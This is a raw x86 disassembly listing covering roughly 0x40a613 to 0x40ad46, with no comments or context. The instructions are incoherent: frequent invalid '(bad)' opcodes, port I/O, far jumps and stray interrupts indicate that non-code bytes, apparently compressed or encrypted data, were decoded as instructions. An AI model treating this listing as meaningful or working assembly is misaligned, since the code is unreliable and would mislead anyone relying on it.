  40a613:	cmp    ebp,DWORD PTR [edx]
  40a615:	jbe    0x40a5da
  40a617:	dec    esi
  40a618:	in     eax,dx
  40a619:	mov    fs,WORD PTR [ebx]
  40a61b:	mov    esp,ebp
  40a61d:	shl    DWORD PTR [eax-0x1f528d98],0x1d
  40a624:	cmp    BYTE PTR [edx-0x69],cl
  40a627:	mov    edx,0xd482baa
  40a62c:	scas   eax,DWORD PTR es:[edi]
  40a62d:	loopne 0x40a607
  40a62f:	std    
  40a630:	out    dx,eax
  40a631:	push   ds
  40a632:	div    BYTE PTR [ebx]
  40a634:	cmp    dl,BYTE PTR [esi+0x651c82ce]
  40a63a:	(bad)  
  40a63b:	nop
  40a63c:	in     al,0xf1
  40a63e:	jg     0x40a5d7
  40a640:	inc    esp
  40a641:	lock test DWORD PTR [eax+0x49c7974b],edi
  40a648:	in     eax,0x7b
  40a64a:	sbb    eax,0x271dadf6
  40a64f:	shl    DWORD PTR [edi-0x1db33486],cl
  40a655:	mov    ds:0x6e438b78,al
  40a65a:	xchg   edi,eax
  40a65b:	and    DWORD PTR [eax],edi
  40a65d:	adc    ecx,DWORD PTR [edx]
  40a65f:	sub    bh,BYTE PTR [esi-0x5]
  40a662:	jns    0x40a64e
  40a664:	in     eax,0x8d
  40a666:	pop    edx
  40a667:	adc    dh,BYTE PTR [ebx+0x4b]
  40a66a:	cdq    
  40a66b:	scas   al,BYTE PTR es:[edi]
  40a66c:	fnstsw WORD PTR [eax+0x48ceaa9d]
  40a672:	sbb    edi,DWORD PTR [ecx+0x570edd13]
  40a678:	or     al,0x5
  40a67a:	inc    esp
  40a67b:	dec    edx
  40a67c:	push   eax
  40a67d:	jecxz  0x40a66a
  40a67f:	or     al,0xd4
  40a681:	mov    ecx,0xfdaf9bd1
  40a686:	iret   
  40a687:	aad    0x3a
  40a689:	cmp    dh,bl
  40a68b:	stos   DWORD PTR es:[edi],eax
  40a68c:	int    0x88
  40a68e:	scas   al,BYTE PTR es:[edi]
  40a68f:	fsub   DWORD PTR [esi-0x62]
  40a692:	repnz leave 
  40a694:	cs push edx
  40a696:	pop    ebp
  40a697:	sbb    DWORD PTR [edx-0xce98d56],esp
  40a69d:	sub    BYTE PTR ds:0x624e1086,ah
  40a6a3:	jns    0x40a62a
  40a6a5:	test   al,0x3
  40a6a7:	lock in eax,dx
  40a6a9:	adc    al,0x6a
  40a6ab:	mov    ebp,DWORD PTR [eax+0x77f7ef42]
  40a6b1:	mov    dh,0x58
  40a6b3:	pop    esi
  40a6b4:	add    al,0x4f
  40a6b6:	ret    0xc29
  40a6b9:	aas    
  40a6ba:	test   eax,0x45897df4
  40a6bf:	ror    BYTE PTR [ebx-0x39cc4bbb],1
  40a6c5:	add    eax,edi
  40a6c7:	jmp    0x40abd2
  40a6cc:	cmp    al,0x3f
  40a6ce:	ret    
  40a6cf:	rol    bl,cl
  40a6d1:	rcl    cl,cl
  40a6d3:	int    0xcd
  40a6d5:	push   cs
  40a6d6:	nop
  40a6d7:	ficomp WORD PTR [edi+0x720dbf47]
  40a6dd:	mov    bh,BYTE PTR [eax+0x78]
  40a6e0:	push   0x7c
  40a6e2:	js     0x40a75c
  40a6e4:	ficom  WORD PTR [ebx-0x2e]
  40a6e7:	imul   ecx,DWORD PTR [ebx+0x1],0x50
  40a6eb:	inc    edi
  40a6ec:	int3   
  40a6ed:	fild   QWORD PTR [esi]
  40a6ef:	das    
  40a6f0:	test   cl,0x38
  40a6f3:	stos   DWORD PTR es:[edi],eax
  40a6f4:	nop
  40a6f5:	ror    DWORD PTR [eax],0x84
  40a6f8:	mov    dl,0xe8
  40a6fa:	dec    eax
  40a6fb:	daa    
  40a6fc:	push   0x4c
  40a6fe:	pop    eax
  40a6ff:	icebp  
  40a700:	push   0x17
  40a702:	outs   dx,BYTE PTR ds:[esi]
  40a703:	push   esp
  40a704:	mov    ch,0x5c
  40a706:	(bad)  
  40a707:	mov    BYTE PTR ds:0x36ea83e8,ah
  40a70d:	gs mov esp,0xfc7b672d
  40a713:	popa   
  40a714:	push   edx
  40a715:	pop    ebp
  40a716:	sbb    al,0xe1
  40a718:	mov    ecx,0xd0183e93
  40a71d:	sub    BYTE PTR [edx+0x579ad0a6],dh
  40a723:	test   al,0x56
  40a725:	jo     0x40a776
  40a727:	push   0xffffff97
  40a729:	jns    0x40a781
  40a72b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72c:	add    BYTE PTR [ebp+ebp*2-0x65aaa883],dh
  40a733:	out    dx,eax
  40a734:	push   ecx
  40a735:	push   ebp
  40a736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a737:	test   BYTE PTR [edx+edx*1],al
  40a73a:	mov    esp,DWORD PTR [esi]
  40a73c:	jns    0x40a7b6
  40a73e:	sbb    cl,BYTE PTR [ecx+0x1a3a13b2]
  40a744:	fbstp  TBYTE PTR [ecx-0x5fc66106]
  40a74a:	sbb    eax,0xb98de912
  40a74f:	jecxz  0x40a708
  40a751:	stos   BYTE PTR es:[edi],al
  40a752:	sbb    ebp,DWORD PTR [ebx]
  40a754:	add    DWORD PTR [ecx+0x3954ec0d],ecx
  40a75a:	loope  0x40a78f
  40a75c:	dec    ebx
  40a75d:	jecxz  0x40a78d
  40a75f:	out    0x5,eax
  40a761:	ins    BYTE PTR es:[edi],dx
  40a762:	repnz scas eax,DWORD PTR es:[edi]
  40a764:	adc    ch,BYTE PTR ds:[eax]
  40a767:	out    dx,al
  40a768:	inc    eax
  40a769:	mov    ch,0x3c
  40a76b:	sub    eax,0x875304a6
  40a770:	inc    esp
  40a771:	jl     0x40a7de
  40a773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a774:	add    eax,0xb416cb34
  40a779:	lods   eax,DWORD PTR ds:[esi]
  40a77a:	cmp    DWORD PTR [ebx],esi
  40a77c:	mov    dh,0x17
  40a77e:	and    DWORD PTR [eax-0x459aab33],ebx
  40a784:	push   eax
  40a785:	stos   DWORD PTR es:[edi],eax
  40a786:	mov    ebp,0xb6771a3a
  40a78b:	es xlat BYTE PTR ss:[ebx]
  40a78e:	jle    0x40a72a
  40a790:	cdq    
  40a791:	mov    ch,0xa9
  40a793:	pop    esi
  40a794:	out    dx,al
  40a795:	adc    ecx,DWORD PTR [esi]
  40a797:	pushf  
  40a798:	call   0x5762:0x5daada9e
  40a79f:	out    0x4c,eax
  40a7a1:	sub    dl,BYTE PTR [eax]
  40a7a3:	outs   dx,DWORD PTR ds:[esi]
  40a7a4:	cmp    DWORD PTR [edi-0x4b],ebx
  40a7a7:	(bad)  [esi]
  40a7a9:	dec    ebp
  40a7aa:	xchg   BYTE PTR [ecx-0x4e6b0403],bh
  40a7b0:	int    0x16
  40a7b2:	xchg   ebp,eax
  40a7b3:	xchg   esi,eax
  40a7b4:	mov    al,0xca
  40a7b6:	sbb    al,0x91
  40a7b8:	sub    ah,BYTE PTR [ecx]
  40a7ba:	ret    0x29c7
  40a7bd:	fldl2t 
  40a7bf:	xlat   BYTE PTR ds:[ebx]
  40a7c0:	ss ret 0x4de
  40a7c4:	lea    esp,[edx-0x48427e24]
  40a7ca:	(bad)  [ebp+ebp*1+0x412b69d9]
  40a7d1:	ds gs sub ah,dh
  40a7d5:	inc    esi
  40a7d6:	std    
  40a7d7:	fwait
  40a7d8:	leave  
  40a7d9:	repnz xor edi,0x8e648510
  40a7e0:	iret   
  40a7e1:	mov    al,ds:0x178fa0da
  40a7e6:	mov    ds:0x7cd388a3,al
  40a7eb:	gs mov dh,0x91
  40a7ee:	cwde   
  40a7ef:	cmp    al,0x37
  40a7f1:	mov    eax,ds:0xeff6496b
  40a7f6:	or     al,0x14
  40a7f8:	add    dl,dh
  40a7fa:	or     al,0x85
  40a7fc:	pop    eax
  40a7fd:	stc    
  40a7fe:	inc    edx
  40a7ff:	jnp    0x40a84e
  40a801:	pop    eax
  40a802:	imul   ecx,esp,0x8dec1bee
  40a808:	repnz push cs
  40a80a:	aam    0x60
  40a80c:	cmp    al,0x83
  40a80e:	ficomp WORD PTR [eax+0x69]
  40a811:	not    DWORD PTR [bx+si+0x5d]
  40a815:	adc    al,BYTE PTR [esi]
  40a817:	sbb    dh,BYTE PTR [edi]
  40a819:	dec    ecx
  40a81a:	imul   ebp,eax,0xffffff88
  40a81d:	(bad)  
  40a81e:	inc    DWORD PTR ds:0x1e912e9
  40a824:	xchg   edx,eax
  40a825:	repz scas eax,DWORD PTR es:[edi]
  40a827:	xlat   BYTE PTR ds:[ebx]
  40a828:	cmp    bh,ah
  40a82a:	push   edi
  40a82b:	pop    esp
  40a82c:	daa    
  40a82d:	push   0xbf77603e
  40a832:	aad    0x66
  40a834:	mov    dh,0x82
  40a836:	pop    eax
  40a837:	test   BYTE PTR [ebx],ah
  40a839:	adc    BYTE PTR [eax],ah
  40a83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a83c:	shl    DWORD PTR [esi+0x20c4d368],1
  40a842:	jecxz  0x40a7e3
  40a844:	inc    ecx
  40a845:	and    eax,DWORD PTR [ebp+0x591c054d]
  40a84b:	jmp    0x40a877
  40a84d:	xchg   edi,eax
  40a84e:	xchg   esp,eax
  40a84f:	pushf  
  40a850:	ja     0x40a824
  40a852:	(bad)  
  40a853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a854:	or     al,0xe9
  40a856:	and    esp,DWORD PTR [ebx+0x22]
  40a859:	(bad)  
  40a85a:	in     eax,dx
  40a85b:	inc    esi
  40a85c:	mov    ds:0xa1158377,eax
  40a861:	sbb    eax,0xffffffe3
  40a864:	gs popw es
  40a867:	stc    
  40a868:	and    BYTE PTR ds:0xb948a40a,ch
  40a86e:	xchg   esi,eax
  40a86f:	or     DWORD PTR [edx+0x5d9fbcb6],0xbacfcc9c
  40a879:	cmp    cl,BYTE PTR [eax-0x1784d9a8]
  40a87f:	jb     0x40a8a9
  40a881:	or     BYTE PTR [ecx+ebp*4+0xa7bdc46],dl
  40a888:	int3   
  40a889:	fxch   st(2)
  40a88b:	jg     0x40a8ce
  40a88d:	sahf   
  40a88e:	ss fs stc 
  40a891:	push   ds
  40a892:	gs pop eax
  40a894:	inc    edx
  40a895:	lods   eax,DWORD PTR ds:[esi]
  40a896:	sub    ah,BYTE PTR [esp+eiz*2+0x4]
  40a89a:	jmp    0xd2b7:0xdaa9180b
  40a8a1:	pop    esi
  40a8a2:	aad    0xa5
  40a8a4:	sub    cl,BYTE PTR [ebx]
  40a8a6:	addr16 test al,0x98
  40a8a9:	add    dl,BYTE PTR [esi-0x64]
  40a8ac:	(bad)  
  40a8ad:	cmp    dl,bl
  40a8af:	adc    esp,DWORD PTR [esi+0x4246b237]
  40a8b5:	pusha  
  40a8b6:	stos   BYTE PTR es:[edi],al
  40a8b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8b8:	mov    al,0x32
  40a8ba:	popf   
  40a8bb:	mov    edx,0xe0de2442
  40a8c0:	dec    esi
  40a8c1:	lods   eax,DWORD PTR ds:[esi]
  40a8c2:	pusha  
  40a8c3:	sbb    eax,0xb7641f74
  40a8c8:	pop    ebp
  40a8c9:	test   al,0xeb
  40a8cb:	adc    eax,0xbb6379fd
  40a8d0:	pop    es
  40a8d1:	jmp    0x67de:0x34b1026d
  40a8d8:	aam    0x1e
  40a8da:	ins    DWORD PTR es:[edi],dx
  40a8db:	(bad)  
  40a8dc:	es push ebx
  40a8de:	popf   
  40a8df:	enter  0x21f,0xb3
  40a8e3:	or     DWORD PTR [esi+0x2f25ae7],edx
  40a8e9:	xchg   ebx,eax
  40a8ea:	xlat   BYTE PTR ds:[ebx]
  40a8eb:	ds sub ebx,esp
  40a8ee:	icebp  
  40a8ef:	aas    
  40a8f0:	repnz inc eax
  40a8f2:	lock push ebx
  40a8f4:	test   al,0xd6
  40a8f6:	cmp    DWORD PTR [ecx-0x20],edi
  40a8f9:	inc    edx
  40a8fa:	add    esp,esp
  40a8fc:	dec    ecx
  40a8fd:	sub    dh,BYTE PTR [ecx-0x6c]
  40a900:	xchg   esp,eax
  40a901:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40a903:	jp     0x40a8df
  40a905:	sbb    ah,BYTE PTR [ebx-0x611de98a]
  40a90b:	loop   0x40a910
  40a90d:	test   DWORD PTR [ebx+0x498998a4],0x4fb08b0c
  40a917:	xchg   esi,eax
  40a918:	add    BYTE PTR [edi],dh
  40a91a:	popf   
  40a91b:	(bad)  
  40a91c:	out    0x13,eax
  40a91e:	cwde   
  40a91f:	and    cl,ah
  40a921:	dec    ebx
  40a922:	xchg   ebp,eax
  40a923:	pop    esi
  40a924:	xor    cl,bh
  40a926:	and    ch,BYTE PTR [ecx+0x3f]
  40a929:	xor    eax,0x696bbfa5
  40a92e:	(bad)  [eax]
  40a930:	inc    esp
  40a931:	pop    ebp
  40a932:	jne    0x40a975
  40a934:	aad    0xd5
  40a936:	stos   BYTE PTR es:[edi],al
  40a937:	lea    ecx,[edi]
  40a939:	emms   
  40a93b:	mov    ebx,0xf34b22d2
  40a940:	sub    al,0x50
  40a942:	cmp    eax,0xd4f5cb84
  40a947:	mov    ch,0x7c
  40a949:	and    al,0x12
  40a94b:	aaa    
  40a94c:	pop    ebx
  40a94d:	repz dec ebp
  40a94f:	inc    ecx
  40a950:	bound  ebx,QWORD PTR [edx+0x5d6b5a3f]
  40a956:	mov    edi,0xe75bb7a3
  40a95b:	js     0x40a944
  40a95d:	or     al,0x28
  40a95f:	mov    cl,0x6a
  40a961:	sbb    DWORD PTR [ecx-0x38b3ef4],ebx
  40a967:	cmp    cl,cl
  40a969:	js     0x40a9a3
  40a96b:	jae    0x40a900
  40a96d:	or     BYTE PTR [ebp+0x2bfe0062],ah
  40a973:	aam    0x99
  40a975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a976:	std    
  40a977:	out    0x27,eax
  40a979:	fldcw  WORD PTR [ebx]
  40a97b:	push   0xffffffe4
  40a97d:	dec    ebp
  40a97e:	push   esp
  40a97f:	and    bl,dh
  40a981:	mov    WORD PTR [edx-0x5272d724],ds
  40a987:	out    dx,al
  40a988:	ins    DWORD PTR es:[edi],dx
  40a989:	push   ebp
  40a98a:	mov    al,ds:0xdc46bc3c
  40a98f:	cmp    al,0xd2
  40a991:	ins    BYTE PTR es:[edi],dx
  40a992:	stos   DWORD PTR es:[edi],eax
  40a993:	xor    eax,0x4d757b8d
  40a998:	inc    eax
  40a999:	scas   al,BYTE PTR es:[edi]
  40a99a:	pop    ds
  40a99b:	hlt    
  40a99c:	and    eax,0x7db71330
  40a9a1:	lods   eax,DWORD PTR ds:[esi]
  40a9a2:	add    DWORD PTR [bx],ebp
  40a9a5:	xchg   edi,eax
  40a9a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a7:	fsub   QWORD PTR ss:[eax+0x7f]
  40a9ab:	add    DWORD PTR [edi],eax
  40a9ad:	clc    
  40a9ae:	sub    esp,DWORD PTR [edx+0x34]
  40a9b1:	das    
  40a9b2:	pusha  
  40a9b3:	cmc    
  40a9b4:	mul    BYTE PTR [esi+0x4e]
  40a9b7:	shr    BYTE PTR [edi-0xf6ade3c],0x91
  40a9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9bf:	push   esp
  40a9c0:	inc    eax
  40a9c1:	dec    ebp
  40a9c2:	or     dh,BYTE PTR [eax-0x6c78bb8e]
  40a9c8:	xor    bl,BYTE PTR [ebx]
  40a9ca:	adc    edi,DWORD PTR ds:0x6fd50040
  40a9d0:	mov    BYTE PTR [edx-0x55c96118],ah
  40a9d6:	push   edx
  40a9d7:	sub    eax,0xff2f372a
  40a9dc:	popf   
  40a9dd:	mov    eax,ds:0x89bf2b9
  40a9e2:	(bad)  
  40a9e3:	lods   eax,DWORD PTR ds:[esi]
  40a9e4:	fs dec esp
  40a9e6:	mov    gs,WORD PTR [eax+0x2]
  40a9e9:	lahf   
  40a9ea:	ret    
  40a9eb:	mov    BYTE PTR fs:[ebx],ch
  40a9ee:	adc    eax,0x27333d06
  40a9f3:	mov    cl,0x7c
  40a9f5:	das    
  40a9f6:	aas    
  40a9f7:	out    dx,al
  40a9f8:	or     DWORD PTR [edx-0x6898a108],ebx
  40a9fe:	cldemote BYTE PTR [eax+edx*8-0x6]
  40aa03:	lods   al,BYTE PTR ds:[esi]
  40aa04:	mov    ebx,0xb297f033
  40aa09:	dec    ecx
  40aa0a:	sub    DWORD PTR [ecx-0x145cfa0f],eax
  40aa10:	ret    0x302
  40aa13:	ds (bad) 
  40aa16:	or     DWORD PTR [eax+0x37],esi
  40aa19:	jne    0x40aa0e
  40aa1b:	sbb    edx,edi
  40aa1d:	fcomip st,st(0)
  40aa1f:	aaa    
  40aa20:	cmc    
  40aa21:	pop    ecx
  40aa22:	jmp    0x83f2:0x890ad763
  40aa29:	mov    dl,0x33
  40aa2b:	(bad)  
  40aa2c:	jnp    0x40aa15
  40aa2e:	das    
  40aa2f:	sub    ecx,DWORD PTR [edi+0x3e574523]
  40aa35:	es stos DWORD PTR es:[edi],eax
  40aa37:	shr    BYTE PTR [edx+0x407d4a52],1
  40aa3d:	fs jl  0x40aaa9
  40aa40:	mov    esi,0xf45fc436
  40aa45:	push   ds
  40aa46:	nop
  40aa47:	shl    DWORD PTR [ebx+edi*2],1
  40aa4a:	sub    DWORD PTR [edi-0x19735960],eax
  40aa50:	mov    dh,0x1d
  40aa52:	call   FWORD PTR ds:0xf7b07dd5
  40aa58:	div    BYTE PTR [ecx-0x7a]
  40aa5b:	adc    DWORD PTR [ecx],esp
  40aa5d:	xor    al,0x34
  40aa5f:	cdq    
  40aa60:	stos   DWORD PTR es:[edi],eax
  40aa61:	rcl    ecx,cl
  40aa63:	fistp  DWORD PTR [eax]
  40aa65:	fstp   DWORD PTR [edx]
  40aa67:	call   0x29953531
  40aa6c:	xchg   BYTE PTR [esp+esi*8],dl
  40aa6f:	(bad)  
  40aa70:	jg     0x40aa54
  40aa72:	into   
  40aa73:	cmp    esi,ebx
  40aa75:	lahf   
  40aa76:	pop    edi
  40aa77:	push   ebp
  40aa78:	sbb    eax,0x29d509b5
  40aa7d:	cmp    ebx,DWORD PTR [edi+0x8b47b68]
  40aa83:	fsubrp st(5),st
  40aa85:	popf   
  40aa86:	sub    dh,BYTE PTR [ebx+0x27]
  40aa89:	(bad)  
  40aa8a:	arpl   WORD PTR ss:[ecx+edi*8+0x3c3f98bf],bx
  40aa92:	mov    edx,0x79d4b137
  40aa97:	mov    ecx,0xb8f15d78
  40aa9c:	in     eax,0x49
  40aa9e:	mov    ah,0x1b
  40aaa0:	pusha  
  40aaa1:	jmp    0xa551d036
  40aaa6:	push   0x8939e805
  40aaab:	push   ecx
  40aaac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaad:	mov    eax,ds:0x57e44e7c
  40aab2:	je     0x40aada
  40aab4:	mov    al,ds:0x4b1f2663
  40aab9:	cwde   
  40aaba:	xchg   ebp,eax
  40aabb:	lahf   
  40aabc:	push   cs
  40aabd:	push   ds
  40aabe:	pop    esp
  40aabf:	xchg   esi,eax
  40aac0:	push   cs
  40aac1:	mov    ?,WORD PTR [esi]
  40aac3:	lea    edx,[edx]
  40aac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aac6:	mov    bl,ah
  40aac8:	mov    DWORD PTR [ebx+0x5152ed6],ebp
  40aace:	pop    ecx
  40aacf:	addr16 loop 0x40aa9d
  40aad2:	adc    DWORD PTR ds:0xfe7217c2,edx
  40aad8:	sti    
  40aad9:	or     eax,0xdac3a50b
  40aade:	push   0x57
  40aae0:	adc    BYTE PTR [ebp+0x49],ch
  40aae3:	xchg   edx,eax
  40aae4:	sbb    BYTE PTR [ebx+edx*4],ch
  40aae7:	test   al,0x44
  40aae9:	clc    
  40aaea:	xor    eax,0x1a3c0fde
  40aaef:	cmp    ebx,DWORD PTR [ebp+0x73]
  40aaf2:	mov    WORD PTR [esi+0x76],fs
  40aaf5:	cwde   
  40aaf6:	mov    ds:0x7e4289dc,al
  40aafb:	and    eax,0xa295056f
  40ab00:	fst    DWORD PTR [ecx-0x63105533]
  40ab06:	lock pop ebp
  40ab08:	or     cl,ch
  40ab0a:	mov    gs,WORD PTR [esi+0x3e]
  40ab0d:	xchg   edi,eax
  40ab0e:	into   
  40ab0f:	cld    
  40ab10:	sar    BYTE PTR [edx],0x9a
  40ab13:	xor    BYTE PTR [edx+ecx*8-0x37],bh
  40ab17:	dec    eax
  40ab18:	or     edi,DWORD PTR [ebx+ecx*1+0x45]
  40ab1c:	test   BYTE PTR ds:0x7ef0d8ef,bh
  40ab22:	retf   
  40ab23:	popf   
  40ab24:	adc    ah,ah
  40ab26:	and    eax,0x65940934
  40ab2b:	mov    ss,WORD PTR [edx+0x20]
  40ab2e:	sbb    eax,0xc28d9b96
  40ab33:	ins    DWORD PTR es:[edi],dx
  40ab34:	dec    esp
  40ab35:	call   0x433c:0x63556da9
  40ab3c:	popa   
  40ab3d:	lahf   
  40ab3e:	mov    BYTE PTR [edx-0x31b6d720],dl
  40ab44:	xchg   BYTE PTR [esp+ebx*1],ah
  40ab47:	arpl   WORD PTR [esi+0xaaee3e3],cx
  40ab4d:	pop    edi
  40ab4e:	in     al,dx
  40ab4f:	pushf  
  40ab50:	imul   eax,ebp,0xffffffe7
  40ab53:	sbb    DWORD PTR [eax],ecx
  40ab55:	lds    ecx,FWORD PTR [edx]
  40ab57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab58:	push   ss
  40ab59:	scas   eax,DWORD PTR es:[edi]
  40ab5a:	mov    al,ds:0x563f8baf
  40ab5f:	sbb    DWORD PTR [edi-0x41f97672],ebx
  40ab65:	addr16 mov edi,0x6f238bf5
  40ab6b:	fdivp  st(1),st
  40ab6d:	retf   0xa8b5
  40ab70:	sub    DWORD PTR [edi],esi
  40ab72:	mov    DWORD PTR [esi+0x1cdbaae0],ebp
  40ab78:	jmp    0x40abad
  40ab7a:	inc    ecx
  40ab7b:	into   
  40ab7c:	je     0x40ab67
  40ab7e:	sub    ah,BYTE PTR es:[edi]
  40ab81:	in     al,0xa4
  40ab83:	ins    BYTE PTR es:[edi],dx
  40ab84:	das    
  40ab85:	cmc    
  40ab86:	mov    cl,0x85
  40ab89:	(bad)  
  40ab8a:	iret   
  40ab8b:	ss jecxz 0x40abed
  40ab8e:	test   eax,0xce4eab57
  40ab93:	pop    ds
  40ab94:	shl    BYTE PTR ds:0x1352e772,cl
  40ab9a:	aad    0xf1
  40ab9c:	js     0x40ab8a
  40ab9e:	inc    edi
  40ab9f:	jl     0x40ac15
  40aba1:	aam    0xa9
  40aba3:	(bad)  
  40aba4:	sub    ebp,DWORD PTR [ebx]
  40aba6:	and    eax,0x63673aa9
  40abab:	xchg   edx,eax
  40abac:	fcomp  DWORD PTR [edx+0x7e]
  40abaf:	adc    al,0x26
  40abb1:	outs   dx,DWORD PTR ds:[esi]
  40abb2:	popa   
  40abb3:	or     DWORD PTR [edi+0x3c],0x55
  40abb7:	vpavgb xmm6,xmm4,XMMWORD PTR [edi]
  40abbb:	jecxz  0x40abaf
  40abbd:	repz or ah,BYTE PTR ds:0x7866466c
  40abc4:	add    DWORD PTR [eax],esp
  40abc6:	cwde   
  40abc7:	sub    al,0xba
  40abc9:	data16 jbe 0x40abe6
  40abcc:	call   0x89c2:0x3f6d7939
  40abd3:	inc    ebp
  40abd4:	int3   
  40abd5:	jmp    0x40b0e0
  40abda:	leave  
  40abdb:	cmp    al,0xc9
  40abdd:	ret    
  40abde:	leave  
  40abdf:	leave  
  40abe0:	leave  
  40abe1:	retf   0xa9ef
  40abe4:	int    0x9e
  40abe6:	aam    0x0
  40abe8:	ret    
  40abe9:	sbb    BYTE PTR [ebp+ecx*4+0x78],0x78
  40abee:	push   0x7c
  40abf0:	js     0x40ac6a
  40abf2:	test   al,0x7d
  40abf4:	in     eax,0xa2
  40abf6:	mov    edi,0xd13d170a
  40abfb:	dec    ecx
  40abfc:	push   edx
  40abfd:	push   esi
  40abfe:	loope  0x40ac32
  40ac00:	enter  0x199c,0xbd
  40ac04:	hlt    
  40ac05:	fidivr DWORD PTR [eax]
  40ac07:	cwde   
  40ac08:	dec    esp
  40ac09:	int    0xe4
  40ac0b:	xchg   ecx,eax
  40ac0c:	inc    ebp
  40ac0d:	nop
  40ac0e:	(bad)  
  40ac0f:	xlat   BYTE PTR ds:[ebx]
  40ac10:	hlt    
  40ac11:	jb     0x40abfa
  40ac13:	sub    BYTE PTR [edx-0x7b],ch
  40ac16:	dec    eax
  40ac17:	das    
  40ac18:	jmp    FWORD PTR [edi+0x1e]
  40ac1b:	retf   0xf019
  40ac1e:	jle    0x40abf1
  40ac20:	inc    ebx
  40ac21:	in     al,dx
  40ac22:	push   0x1523fd68
  40ac27:	sub    ebx,esi
  40ac29:	std    
  40ac2a:	sbb    BYTE PTR [edi+ebp*2+0xc],0x0
  40ac2f:	xor    al,0xeb
  40ac31:	xchg   BYTE PTR [edx+ecx*2-0x1],bl
  40ac35:	or     DWORD PTR [ecx],ecx
  40ac37:	mov    ebp,0x2bcd5b7
  40ac3c:	dec    ecx
  40ac3d:	jle    0x40acb7
  40ac3f:	popf   
  40ac40:	or     eax,0x4b6c6d97
  40ac45:	outs   dx,DWORD PTR ds:[esi]
  40ac46:	jmp    0x2abe:0xa7ccc347
  40ac4d:	jmp    0xf25edfb9
  40ac52:	pop    ss
  40ac53:	push   eax
  40ac54:	mov    dl,0x27
  40ac57:	or     eax,0xac6f246f
  40ac5c:	in     eax,0xc
  40ac5e:	cwde   
  40ac5f:	imul   ebp,edx,0xffffff97
  40ac62:	mov    esi,0xb1ed605e
  40ac67:	push   esi
  40ac68:	dec    ebp
  40ac69:	pop    ebx
  40ac6a:	(bad)  
  40ac6c:	push   ebp
  40ac6d:	jno    0x40ac96
  40ac6f:	add    eax,0xfa7c5b49
  40ac74:	push   0x52
  40ac76:	out    dx,eax
  40ac77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac78:	adc    DWORD PTR [esi],eax
  40ac7a:	call   0x1e9c8b6
  40ac7f:	dec    ebx
  40ac80:	push   ss
  40ac81:	test   DWORD PTR [esi],esi
  40ac83:	stos   BYTE PTR es:[edi],al
  40ac84:	add    al,0x13
  40ac86:	xor    esi,DWORD PTR [edi]
  40ac88:	mov    ds:0xf2399c24,al
  40ac8d:	inc    edx
  40ac8e:	stos   BYTE PTR es:[edi],al
  40ac8f:	add    al,0x68
  40ac91:	fcomp  QWORD PTR [edi+0x61]
  40ac94:	test   BYTE PTR [eax+0x2a],dl
  40ac97:	jo     0x40ac21
  40ac99:	iret   
  40ac9a:	inc    esi
  40ac9b:	mov    al,ds:0x950b4331
  40aca0:	out    dx,al
  40aca1:	xchg   BYTE PTR [esi+0x6c],ch
  40aca4:	fdivr  QWORD PTR [edi]
  40aca6:	int    0xd
  40aca8:	add    eax,DWORD PTR [ecx]
  40acaa:	jo     0x40ac46
  40acac:	mov    ah,0x1
  40acae:	pop    esp
  40acaf:	sti    
  40acb0:	stos   BYTE PTR es:[edi],al
  40acb1:	jae    0x40ad0d
  40acb3:	push   ecx
  40acb4:	sti    
  40acb5:	jno    0x40ad25
  40acb7:	or     BYTE PTR [edi],0xdb
  40acba:	push   cs
  40acbb:	in     eax,0xc1
  40acbd:	or     cl,BYTE PTR [esi-0x3b]
  40acc0:	pop    ds
  40acc1:	or     bh,BYTE PTR [esi+0x46]
  40acc4:	idiv   BYTE PTR [ebp+0x5]
  40acc7:	aad    0x7b
  40acc9:	inc    ebx
  40acca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40accb:	inc    ecx
  40accc:	mov    DWORD PTR [ebp+0x709e1c5e],0x75055696
  40acd6:	sub    DWORD PTR [ebx+0x1f],ebp
  40acd9:	gs xor al,0x29
  40acdc:	jp     0x40acb5
  40acde:	ja     0x40ad12
  40ace0:	fsub   DWORD PTR [ecx]
  40ace2:	xchg   edi,eax
  40ace3:	call   0xfb6797e4
  40ace8:	inc    esp
  40ace9:	pop    ebx
  40acea:	push   ebp
  40aceb:	cwde   
  40acec:	mov    eax,0xfc2f43f7
  40acf1:	push   eax
  40acf2:	push   ebx
  40acf3:	mov    ah,0x43
  40acf5:	fdivr  QWORD PTR [edx]
  40acf7:	mov    dl,0x30
  40acf9:	arpl   WORD PTR [eax+0x18],dx
  40acfc:	scas   eax,DWORD PTR es:[edi]
  40acfd:	fmul   QWORD PTR [edx]
  40acff:	push   ebx
  40ad00:	fxch   st(0)
  40ad02:	mov    ebx,0x8307dd37
  40ad07:	xchg   BYTE PTR [ebp+0x3ecb28b0],ah
  40ad0d:	inc    esp
  40ad0e:	lods   al,BYTE PTR ds:[esi]
  40ad0f:	mov    esi,0xfa31a993
  40ad14:	nop
  40ad15:	pop    gs
  40ad17:	nop
  40ad18:	repz aaa 
  40ad1a:	loop   0x40ad0b
  40ad1c:	loopne 0x40ad59
  40ad1e:	test   BYTE PTR [ebp-0x4b],bl
  40ad21:	pop    ds
  40ad22:	pop    edx
  40ad23:	lock ins DWORD PTR es:[edi],dx
  40ad25:	pop    esi
  40ad26:	jo     0x40acda
  40ad28:	mul    DWORD PTR ss:[edi*1-0x5cfecbd0]
  40ad30:	fidivr WORD PTR [eax+0xd]
  40ad33:	(bad)  [ebx+ebp*8+0x5]
  40ad37:	rcl    DWORD PTR ds:0x7cfd9f67,1
  40ad3d:	xlat   BYTE PTR ds:[ebx]
  40ad3e:	cmp    DWORD PTR [eax+0x39],0x48
  40ad42:	rcr    DWORD PTR [edx+0x4e],0x48
  40ad46:	add    BYTE PTR [ebx],ah
